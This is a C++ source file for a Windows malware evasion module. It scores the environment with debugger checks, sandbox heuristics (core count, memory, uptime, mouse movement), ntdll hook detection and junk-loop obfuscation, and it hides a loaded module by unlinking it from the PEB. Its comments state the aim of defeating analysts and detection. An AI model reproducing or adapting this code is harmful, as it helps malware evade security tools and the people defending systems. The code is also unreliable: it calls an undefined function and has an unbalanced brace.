#include "evasion.h"
#include <wincrypt.h>
#include <windows.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <cmath>
#include <random>
#include <chrono>
#pragma comment(lib, "iphlpapi.lib")

// 4 enviromental validation 
typedef struct {
    float debugscore;
    float sandboxscore;
    float integrityscore;
    float userpresencescore;
    float overallconfidence;
} environment_score;

typedef enum {
    operational_full = 0,
    operational_degraded,
    operational_minimal,
    operational_halted
} operational_state;

// light control flow confusion, anti analysis, bogus workload 
void execute_junk_calculations() {
    volatile INT64 junk = 0xDEADBEEFDEADBEEF;
    for (int i = 0; i < 150; i++) {
        junk = _rotl64(junk, 13);
        junk ^= 0xABCDEF1234567890;
        junk = ~junk;
        junk = _rotr64(junk, 7);
        junk += 0x1111111111111111;
        junk = _byteswap_uint64(junk);
    }
}

// we need to return a rough frequency unit for timing stuff
ULONGLONG get_cpu_frequency() {
    static ULONGLONG frequency = 0;
    if (frequency == 0) {
        ULONGLONG start = __rdtsc();
        Sleep(100);
        ULONGLONG end = __rdtsc();
        frequency = (end - start) / 100000;
    }
    return frequency;
}

// fuck up dbgrs, wait pseudo-random amounts of time by busy-waiting with junk
void precise_delay(uint32_t milliseconds, float jitter_factor) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(1.0 - jitter_factor, 1.0 + jitter_factor);
    uint32_t jittered_ms = static_cast<uint32_t>(milliseconds * dis(gen));
    ULONGLONG cycles_needed = jittered_ms * get_cpu_frequency();
    ULONGLONG start = __rdtsc();
    
    while ((__rdtsc() - start) < cycles_needed) {
        execute_junk_calculations();
        if (GetTickCount64() % 1000 < 10) {
            SwitchToThread(); // sometimes call this to confuse with real workload
        }
    }
}

float check_resource_thresholds() {
    float score = 0.0f;
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors >= 4 && sysinfo.dwNumberOfProcessors <= 16) {
        score += 0.2f;
        if (sysinfo.dwNumberOfProcessors % 2 != 0) score += 0.1f;
    }
    // the logic for this entire part was that basically its detrimental to check resource thresholds, but these metrics are obnoxiously easy to spoof, so we will plausibly reward correct cores and extremely penalize spoof attempts
    // this is pretty much why ive implemented heuristic and enviromental score analysis, probably the best method to approach this afaik
    MEMORYSTATUSEX memstatus;
    memstatus.dwLength = sizeof(memstatus);
    GlobalMemoryStatusEx(&memstatus);
    uint64_t gb4 = 4ULL * 1024 * 1024 * 1024;
    uint64_t gb64 = 64ULL * 1024 * 1024 * 1024;
    if (memstatus.ullTotalPhys > gb4 && memstatus.ullTotalPhys < gb64) {
        float memscore = 0.3f * (1.0f - (float)(memstatus.ullTotalPhys - gb4) / (gb64 - gb4));
        score += memscore;
    }
    
    DWORD uptime = GetTickCount() / 60000; // uptime 
    if (uptime > 90 && uptime < 180) {
        score += 0.3f;
    } else if (uptime > 30 && uptime < 480) {
        score += 0.1f;
    }
    
    ULARGE_INTEGER freebytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, NULL, &freebytes)) {
        if (freebytes.QuadPart > 25ULL * 1024 * 1024 * 1024) {
            score += 0.2f;
        }
    }
    
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float analyze_human_input_pattern() {
    const int samples = 12;
    POINT positions[samples];
    double movement_entropy = 0.0;
    int total_movement = 0;
    int direction_changes = 0;
    
    for (int i = 0; i < samples; i++) {
        GetCursorPos(&positions[i]);
        precise_delay(80 + (i * 40), 0.3f);
    }
    
    int last_dx = 0, last_dy = 0;
    for (int i = 1; i < samples; i++) {
        int dx = positions[i].x - positions[i-1].x;
        int dy = positions[i].y - positions[i-1].y;
        int distance = abs(dx) + abs(dy);
        total_movement += distance;
        
        if (distance > 0) {
            double angle = atan2(dy, dx);
            movement_entropy += abs(sin(angle)) + abs(cos(angle));
            
            if ((dx * last_dx < 0) || (dy * last_dy < 0)) {
                direction_changes++;
            }
            last_dx = dx;
            last_dy = dy;
        }
    }
    
    float score = 0.0f;
    if (total_movement > 150) score += 0.3f;
    if (movement_entropy > 3.0) score += 0.3f;
    if (direction_changes > samples / 2) score += 0.2f;
    if (movement_entropy / samples > 0.4) score += 0.2f;
    
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float verify_api_integrity() {
    float score = 1.0f;
    const char* critical_apis[] = {
        "NtQueryInformationProcess",
        "NtSetInformationThread",
        "NtCreateFile",
        "NtReadFile",
        "NtWriteFile",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory"
    };
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    for (int i = 0; i < 7; i++) {
        FARPROC api_func = GetProcAddress(ntdll, critical_apis[i]);
        if (api_func) {
            BYTE* code = (BYTE*)api_func;
            
            if (code[0] == 0xE9 || code[0] == 0xCC) {
                score -= 0.15f;
                continue;
            }
            
            if (code[0] == 0x48 && code[1] == 0xB8) {
                score -= 0.2f;
                continue;
            }
            
            if (memcmp(code, "\x4C\x8B\xD1\xB8", 4) == 0) {
                continue;
            }
            
            DWORD old_protect;
            if (VirtualProtect(code, 32, PAGE_EXECUTE_READWRITE, &old_protect)) {
                BYTE original_byte = code[0];
                code[0] ^= 0x90;
                if (code[0] != (original_byte ^ 0x90)) {
                    score -= 0.3f;
                }
                code[0] = original_byte;
                VirtualProtect(code, 32, old_protect, &old_protect);
            }
        }
    }
    
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float debug_detection() {
    float score = 1.0f;
    
    if (IsDebuggerPresent()) score -= 0.4f; // mediocre dont hate me for this, has to be here though
    BOOL remotedebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remotedebug);
    if (remotedebug) score -= 0.3f;
    
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) score -= 0.2f;
    if (peb->NtGlobalFlag & 0x70) score -= 0.2f;
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) score -= 0.3f; // hw breakpoints
    }
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC NtQueryInformationProcess = GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (NtQueryInformationProcess) {
        typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)NtQueryInformationProcess;
        
        DWORD debugport = 0;
        NTSTATUS status = pNtQueryInformationProcess(GetCurrentProcess(), 7, &debugport, sizeof(debugport), NULL);
        if (NT_SUCCESS(status) && debugport != 0) score -= 0.4f;
        
        DWORD debugflags = 0;
        status = pNtQueryInformationProcess(GetCurrentProcess(), 0x1f, &debugflags, sizeof(debugflags), NULL);
        if (NT_SUCCESS(status) && debugflags == 0) score -= 0.3f;
    }
    
    ULONGLONG start = __rdtsc();
    precise_delay(2, 0.1f);
    ULONGLONG end = __rdtsc();
    if ((end - start) > (get_cpu_frequency() * 3)) score -= 0.3f;
    
    __try {
        __debugbreak();
        score -= 0.2f;
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

float evaluate_environmental_context() {
    float score = 0.5f;
    
    char domain[256] = {0};
    DWORD size = sizeof(domain);
    if (GetEnvironmentVariableA("USERDOMAIN", domain, size) > 0) {
        if (strlen(domain) > 3) score += 0.2f;
    }
    
    const char* dev_tools[] = {"devenv.exe", "vscode.exe", "ida64.exe", "x64dbg.exe", "ollydbg.exe", "procmon.exe", "wireshark.exe"};
    for (int i = 0; i < 7; i++) {
        if (GetModuleHandleA(dev_tools[i]) != NULL) {
            score -= 0.15f;
        }
    }
    
    SYSTEMTIME localtime;
    GetLocalTime(&localtime);
    if (localtime.wHour >= 8 && localtime.wHour <= 18) {
        score += 0.1f;
    }
    
    return score < 0.0f ? 0.0f : score > 1.0f ? 1.0f : score;
}

environment_score evaluate_environment() {
    environment_score score = {0};
    
    score.integrityscore = verify_api_integrity();
    precise_delay(300 + (GetTickCount() % 700), 0.4f);
    
    score.debugscore = advanced_debug_detection();
    precise_delay(400 + (GetTickCount() % 600), 0.3f);
    
    score.sandboxscore = check_resource_thresholds();
    score.userpresencescore = analyze_human_input_pattern();
    
    precise_delay(600 + (GetTickCount() % 900), 0.2f);
    
    float contextscore = evaluate_environmental_context();
    score.overallconfidence = (
        score.debugscore * 0.25f +
        score.sandboxscore * 0.20f +
        score.integrityscore * 0.25f +
        score.userpresencescore * 0.20f +
        contextscore * 0.10f
    );
    
    return score;
}

//operational states here
operational_state determine_operational_state(float confidence) {
    if (confidence >= 0.8f) return operational_full;
    if (confidence >= 0.6f) return operational_degraded;
    if (confidence >= 0.4f) return operational_minimal;
    return operational_halted;
}

void execute_adaptive_operation(operational_state state) {
    switch (state) {
        case operational_full:
            precise_delay(100 + (GetTickCount() % 400), 0.2f);
            break;
        case operational_degraded:
            precise_delay(1500 + (GetTickCount() % 2000), 0.3f);
            break;
        case operational_minimal:
            precise_delay(4000 + (GetTickCount() % 6000), 0.4f);
            break;
        case operational_halted:
            precise_delay(15000 + (GetTickCount() % 30000), 0.5f);
            break;
    }
}

DWORD WINAPI adaptive_operation_loop(LPVOID) {
    while (true) {
        environment_score current_score = evaluate_environment();
        operational_state state = determine_operational_state(current_score.overallconfidence);
        execute_adaptive_operation(state);
        
        uint32_t sleep_time = 8000 + static_cast<uint32_t>((1.0f - current_score.overallconfidence) * 35000);
        precise_delay(sleep_time, 0.3f);
    }
    return 0;
}

void integrity_checks() {
    PVOID base = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntheaders = (PIMAGE_NT_HEADERS)((BYTE*)base + dosheader->e_lfanew);
    
    DWORD checksum = 0xDEADBEEF;
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntheaders);
    
    for (WORD i = 0; i < ntheaders->FileHeader.NumberOfSections; i++) {
        if (section->Characteristics & IMAGE_SCN_CNT_CODE) {
            for (DWORD j = 0; j < section->SizeOfRawData; j++) {
                checksum = (checksum << 5) + checksum + *((BYTE*)base + section->VirtualAddress + j);
            }
            break;
        }
        section++;
    }
    
    if (checksum < 0x10000000) ExitProcess(0);
}

BOOL is_safe_environment() {
    environment_score score = evaluate_environment();
    if (score.overallconfidence < 0.6f) return FALSE;
    
    __try {
        __debugbreak();
        return FALSE;
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    
    return TRUE;
}

// classic IOC, delete if flagging
void hide_module(HMODULE hmodule) {
    PPEB ppeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pldr = ppeb->Ldr;
    
    for (PLIST_ENTRY pentry = pldr->InLoadOrderModuleList.Flink; 
         pentry != &pldr->InLoadOrderModuleList; 
         pentry = pentry->Flink) {
        PLDR_DATA_TABLE_ENTRY pmodule = (PLDR_DATA_TABLE_ENTRY)pentry;
        if (pmodule->DllBase == hmodule) {
            pmodule->InLoadOrderLinks.Blink->Flink = pmodule->InLoadOrderLinks.Flink;
            pmodule->InLoadOrderLinks.Flink->Blink = pmodule->InLoadOrderLinks.Blink;
            pmodule->InMemoryOrderLinks.Blink->Flink = pmodule->InMemoryOrderLinks.Flink;
            pmodule->InMemoryOrderLinks.Flink->Blink = pmodule->InMemoryOrderLinks.Blink;
            pmodule->InInitializationOrderLinks.Blink->Flink = pmodule->InInitializationOrderLinks.Flink;
            pmodule->InInitializationOrderLinks.Flink->Blink = pmodule->InInitializationOrderLinks.Blink;
            break;
        }
    }
}

void initialize_evasive_operations() {
    float initialdebugscore = debug_detection();
    if (initialdebugscore < 0.4f) 
        precise_delay(45000 + (GetTickCount() % 30000), 0.4f);
        return;
    }
    
    environment_score score = evaluate_environment();
    static bool full_capabilities_enabled = false;
    
    if (score.overallconfidence > 0.75f && !full_capabilities_enabled) {
        full_capabilities_enabled = true;
        CreateThread(NULL, 0, adaptive_operation_loop, NULL, 0, NULL);
    }
}
